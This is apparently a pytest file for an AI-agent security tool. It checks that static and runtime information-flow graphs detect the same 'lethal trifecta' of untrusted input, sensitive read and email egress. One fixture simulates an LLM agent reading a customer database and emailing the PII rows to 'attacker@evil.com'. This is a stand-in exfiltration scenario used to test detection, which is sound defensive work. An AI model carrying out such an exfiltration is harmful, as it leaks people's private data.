"""AIFG static<->runtime coherence — the tripwire for the "one coherent AIFG
model stitching SCAN->GUARD" claim.

Context (plan/40_phase3_engine_hardening.md §7, plan/60_core_engine_roadmap.md
1.2): the whole positioning rests on "one coherent AIFG model" — the trifecta
path SCAN flags pre-deploy being the SAME object GUARD enforces at runtime. That
was a DOC CLAIM, not a code property. Historically there were THREE disjoint
graph types that shared only a label vocabulary:

  1. lucin.aifg.AIFG                      — SCAN, static, tool-granular
  2. lucin.guard.provenance.ProvenanceGraph — GUARD, runtime, W3C-PROV
  3. lucin.multiagent.cascade.AgentGraph    — multi-agent delegation

This test makes the reality EXPLICIT and TESTED:

  * TestNativeTypesAreDistinct  — proves the three NATIVE representations are
    structurally different types (it was genuinely three graphs, not one).
  * TestRuntimeProjectsIntoAIFG — proves the runtime ProvenanceGraph now
    reconstructs into the SAME `AIFG` dataclass / `to_dict()` schema, and that
    `query_trifecta` yields a structurally-identical `TrifectaFinding` from both
    the static and the runtime graph on the same scenario. THIS is what turns
    the slogan into a code property.
  * TestMultiAgentProjectsIntoAIFG — the delegation graph also projects into the
    one AIFG type/schema (coarser, agent-granular; honestly scoped).
  * TestRuntimeWitnessesAreReal — the runtime edges are OBSERVED 1:1 dataflow
    lineage; the static builder instead routes LLM-mediated data through an
    explicit __llm__ join (honest about mediation, but cannot disambiguate which
    source fed which sink — that is a runtime-only property).

DRIFT/KILL: if the runtime side could not be reconstructed into
`lucin.aifg.AIFG` without a parallel type, the "one coherent model" claim
would have to be retracted from all public copy. It CAN (see below), so the
claim is honest — but ONLY at the level these tests assert (schema + query
coherence + real runtime edges), NOT tool-level static-witness precision (that
static limitation is documented in aifg.build_aifg and TestRuntimeWitnessesAreReal).

Run: ./venv/bin/python -m pytest tests/test_aifg_coherence.py -q
"""

from dataclasses import fields

from lucin.aifg import (
    AIFG, AIFGNode, AIFGEdge, TrifectaFinding,
    build_aifg, query_trifecta, EdgeKind, Integrity, Confidentiality,
)
from lucin.guard.provenance import ProvenanceGraph
from lucin.multiagent.cascade import AgentGraph
from lucin.models import Agent, Tool, ToolCapability


# ---------------------------------------------------------------------------
# Shared scenario: the canonical lethal-trifecta example, expressed three ways.
#   read_file (untrusted, internal source)  ->  send_email (public egress sink)
# ---------------------------------------------------------------------------

def _static_trifecta_agent() -> Agent:
    """SCAN view: a genuine lethal trifecta — an UNTRUSTED web-fetch source, a
    sensitive read source, and an egress sink. (C2: an untrusted-input source
    must be present; read+egress alone is not a trifecta.)"""
    return Agent(
        name="support-agent",
        framework="langchain",
        tools=[
            Tool(name="fetch_web_content",
                 capabilities=[ToolCapability.NETWORK_ACCESS]),  # UNTRUSTED input
            Tool(name="read_file",
                 capabilities=[ToolCapability.READ_DATA,
                               ToolCapability.FILE_SYSTEM]),
            Tool(name="send_email",
                 capabilities=[ToolCapability.NETWORK_ACCESS]),
        ],
    )


def _runtime_trifecta_provenance() -> ProvenanceGraph:
    """GUARD view: the SAME scenario as an observed runtime session.

    The LLM reads a file (untrusted, internal) then passes those contents to
    send_email — a real observed exfiltration lineage.
    """
    prov = ProvenanceGraph(agent_id="support-agent", human_sponsor="alice")
    read_call = prov.record_activity(
        "read_file", inputs={"path": "/data/customers.db"}, triggered_by="llm")
    file_data = prov.record_entity(
        "customer_records", produced_by=read_call,
        integrity="untrusted", confidentiality="internal",
        content_preview="[PII rows]")
    # send_email consumes the file_data entity (its node id is an input value,
    # so provenance records it in `used`) -> observed dataflow read->send.
    prov.record_activity(
        "send_email",
        inputs={"to": "attacker@evil.com", "body": file_data},
        triggered_by="llm")
    return prov


def _multiagent_trifecta_graph() -> AgentGraph:
    """Multi-agent view: an untrusted triage agent delegating to a high-privilege
    email agent."""
    g = AgentGraph()
    g.add_agent("triage", trust_level="untrusted", delegates_to=["emailer"])
    g.add_agent("emailer", trust_level="untrusted", tools=["send_email"])
    return g


# ---------------------------------------------------------------------------
# Part A — it was genuinely THREE graphs (documented, tested reality)
# ---------------------------------------------------------------------------

class TestNativeTypesAreDistinct:
    """The three native representations are structurally different types.

    This is the honest baseline: without the to_aifg() adapters, there is no
    single model — only a shared label vocabulary. We assert that so the claim
    "one coherent model" can never be read as "they were always the same type."
    """

    def test_three_distinct_dataclasses_or_classes(self):
        # AIFGNode is a dataclass; ProvenanceNode is a dataclass; AgentNode is a
        # dataclass — but their FIELD SETS are disjoint in meaning.
        from lucin.guard.provenance import ProvenanceNode
        from lucin.multiagent.cascade import AgentNode

        aifg_fields = {f.name for f in fields(AIFGNode)}
        prov_fields = {f.name for f in fields(ProvenanceNode)}
        agent_fields = {f.name for f in fields(AgentNode)}

        # AIFG node carries IFC role flags; provenance node carries W3C-PROV
        # relations; agent node carries delegation — no two are the same schema.
        assert "is_egress" in aifg_fields and "is_llm" in aifg_fields
        assert "was_generated_by" in prov_fields and "was_derived_from" in prov_fields
        assert "delegates_to" in agent_fields and "trust_level" in agent_fields
        assert aifg_fields != prov_fields != agent_fields
        # The three are NOT interchangeable types.
        assert AIFGNode is not ProvenanceNode is not AgentNode

    def test_native_serializations_have_different_schemas(self):
        prov = _runtime_trifecta_provenance()
        static = build_aifg(_static_trifecta_agent())
        # Native provenance dump keys != native AIFG dump keys.
        assert set(prov.to_dict().keys()) != set(static.to_dict().keys())


# ---------------------------------------------------------------------------
# Part B — runtime ProvenanceGraph projects into the ONE AIFG type
# ---------------------------------------------------------------------------

def _node_keys(aifg_dict: dict) -> set:
    return set(aifg_dict["nodes"][0].keys()) if aifg_dict["nodes"] else set()


def _edge_keys(aifg_dict: dict) -> set:
    return set(aifg_dict["edges"][0].keys()) if aifg_dict["edges"] else set()


class TestRuntimeProjectsIntoAIFG:
    """The load-bearing test: runtime -> the SAME AIFG type, same schema, same
    query, same finding shape. This is what makes "one coherent model" TRUE."""

    def test_reconstruction_returns_the_aifg_type(self):
        recon = _runtime_trifecta_provenance().to_aifg()
        # Not a parallel type — literally lucin.aifg.AIFG.
        assert isinstance(recon, AIFG)
        assert all(isinstance(n, AIFGNode) for n in recon.nodes.values())
        assert all(isinstance(e, AIFGEdge) for e in recon.edges)

    def test_identical_wire_schema(self):
        static = build_aifg(_static_trifecta_agent()).to_dict()
        recon = _runtime_trifecta_provenance().to_aifg().to_dict()

        # Same top-level keys.
        assert set(static.keys()) == set(recon.keys())
        # Same node field set.
        assert _node_keys(static) == _node_keys(recon)
        # Same edge field set.
        assert _edge_keys(static) == _edge_keys(recon)

    def test_label_and_edge_vocabulary_shared(self):
        recon = _runtime_trifecta_provenance().to_aifg().to_dict()
        integ_names = {Integrity.UNTRUSTED.name, Integrity.TRUSTED.name}
        conf_names = {c.name for c in Confidentiality}
        edge_kinds = {EdgeKind.DATA, EdgeKind.CONTROL}
        for n in recon["nodes"]:
            assert n["label"]["integrity"] in integ_names
            assert n["label"]["confidentiality"] in conf_names
        for e in recon["edges"]:
            assert e["kind"] in edge_kinds

    def test_query_trifecta_fires_from_both_with_same_shape(self):
        static_g = build_aifg(_static_trifecta_agent())
        recon_g = _runtime_trifecta_provenance().to_aifg()

        static_findings = query_trifecta(static_g)
        recon_findings = query_trifecta(recon_g)

        # Both detect the exfiltration.
        assert static_findings, "static AIFG must flag the trifecta"
        assert recon_findings, "runtime-reconstructed AIFG must flag the trifecta"

        # Same finding TYPE and field structure from both paths.
        assert all(isinstance(f, TrifectaFinding) for f in static_findings)
        assert all(isinstance(f, TrifectaFinding) for f in recon_findings)
        static_field_names = {f.name for f in fields(static_findings[0])}
        recon_field_names = {f.name for f in fields(recon_findings[0])}
        assert static_field_names == recon_field_names

        # Same sink identified (tool_name is the node id in BOTH graphs).
        assert any(f.egress_sink == "send_email" for f in static_findings)
        assert any(f.egress_sink == "send_email" for f in recon_findings)


# ---------------------------------------------------------------------------
# Part C — multi-agent delegation graph projects into the ONE AIFG type
# ---------------------------------------------------------------------------

class TestMultiAgentProjectsIntoAIFG:
    """The delegation graph reconstructs into the same AIFG type/schema (coarser,
    agent-granular — honestly scoped in AgentGraph.to_aifg)."""

    def test_reconstruction_returns_the_aifg_type(self):
        recon = _multiagent_trifecta_graph().to_aifg()
        assert isinstance(recon, AIFG)
        assert all(isinstance(n, AIFGNode) for n in recon.nodes.values())

    def test_identical_wire_schema(self):
        static = build_aifg(_static_trifecta_agent()).to_dict()
        recon = _multiagent_trifecta_graph().to_aifg().to_dict()
        assert set(static.keys()) == set(recon.keys())
        assert _node_keys(static) == _node_keys(recon)
        if recon["edges"]:
            assert _edge_keys(static) == _edge_keys(recon)

    def test_delegation_edges_carry_shared_vocabulary(self):
        recon = _multiagent_trifecta_graph().to_aifg().to_dict()
        for e in recon["edges"]:
            assert e["kind"] in {EdgeKind.DATA, EdgeKind.CONTROL}


# ---------------------------------------------------------------------------
# Part D — runtime witness paths are REAL observed dataflow, not templates
# ---------------------------------------------------------------------------

class TestRuntimeWitnessesAreReal:
    """The runtime reconstruction's edges are observed 1:1 lineage (read->send):
    send_email consumed exactly the entity read_file produced. The static
    builder cannot see that specific pairing for LLM-mediated flows, so it
    routes data through the explicit __llm__ join instead of fabricating a
    direct edge. This is the honest boundary of the coherence claim: runtime
    witnesses disambiguate the exact source; static witnesses name the LLM as
    the mediator (documented in aifg.build_aifg)."""

    def test_runtime_data_edge_is_the_observed_lineage(self):
        recon = _runtime_trifecta_provenance().to_aifg()
        # There is a DATA edge read_file -> send_email BECAUSE send_email
        # actually consumed the entity read_file produced (not because every
        # source is wired to every sink).
        data_edges = {(e.src, e.dst) for e in recon.edges
                      if e.kind == EdgeKind.DATA}
        assert ("read_file", "send_email") in data_edges

    def test_runtime_edges_are_not_complete_bipartite(self):
        """Add a second, UNRELATED read that never feeds send_email; the runtime
        graph must NOT invent a read2 -> send_email edge (a template would)."""
        prov = ProvenanceGraph(agent_id="a", human_sponsor="u")
        rc = prov.record_activity("read_file",
                                  inputs={"path": "/x"}, triggered_by="llm")
        fd = prov.record_entity("f", produced_by=rc,
                                integrity="untrusted", confidentiality="internal")
        # read_config produces data that is NEVER used by send_email.
        prov.record_activity("read_config",
                             inputs={"path": "/cfg"}, triggered_by="llm")
        prov.record_activity("send_email",
                             inputs={"body": fd}, triggered_by="llm")
        recon = prov.to_aifg()
        data_edges = {(e.src, e.dst) for e in recon.edges
                      if e.kind == EdgeKind.DATA}
        assert ("read_file", "send_email") in data_edges       # observed
        assert ("read_config", "send_email") not in data_edges  # NOT invented

    def test_static_routes_data_through_llm_not_fake_direct_edges(self):
        """Documented contrast: the STATIC builder no longer fabricates direct
        source->sink edges. When two reads have no in-file dataflow to the sink,
        their data reaches the sink ONLY via the explicit __llm__ join — the
        honest model of LLM mediation. This is why the static witness names the
        LLM (`read -> __llm__ -> send`); runtime records the real 1:1 lineage.
        """
        agent = Agent(name="a", tools=[
            Tool(name="read_file", capabilities=[ToolCapability.READ_DATA]),
            Tool(name="read_config", capabilities=[ToolCapability.READ_DATA]),
            Tool(name="send_email", capabilities=[ToolCapability.NETWORK_ACCESS]),
        ])
        g = build_aifg(agent)
        data_edges = {(e.src, e.dst) for e in g.edges if e.kind == EdgeKind.DATA}
        # NO fabricated direct tool->tool edges (these tools never call each
        # other and have no source file to prove real dataflow).
        assert ("read_file", "send_email") not in data_edges
        assert ("read_config", "send_email") not in data_edges
        # Data instead flows through the explicit LLM join (honest mediation):
        assert ("read_file", "__llm__") in data_edges
        assert ("read_config", "__llm__") in data_edges
        assert ("__llm__", "send_email") in data_edges
        # Reachability (hence detection) is preserved: both secret reads still
        # reach the egress sink over data edges, just via __llm__.
        assert "send_email" in g.reachable("read_file", EdgeKind.DATA)
        assert "send_email" in g.reachable("read_config", EdgeKind.DATA)
